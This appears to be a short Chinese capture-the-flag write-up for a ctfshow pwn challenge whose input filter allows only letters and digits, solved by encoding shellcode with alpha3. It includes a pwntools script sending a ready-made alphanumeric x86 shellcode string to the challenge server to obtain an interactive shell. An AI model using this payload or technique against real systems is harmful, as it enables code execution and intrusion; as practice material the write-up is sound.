# 挑战简介
你是一个好人

# 思路
你是一个好人，说明此题会有百般过滤来阻止你的shellcode  

逻辑上判断是否是在 0x61~0x7A(a-z) , 再判断 0x41~0x5A（A-Z） ， 0x30~0x5a(0-Z) 所以 shellcode 是需要由大小写字母及数字构成

所以shellcode是由大小写字母以及数字构成的

所以利用alpha3对shellcode进行处理即可

```
from pwn import *
from LibcSearcher import *
context.log_level = "debug"

context(os='linux', arch='i386', log_level='debug')

p = remote("pwn.challenge.ctf.show",28156)
elf = ELF('D:\edge 下载\pwn')

shellcode="Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t"

payload = shellcode

p.send(payload)

p.interactive()

```
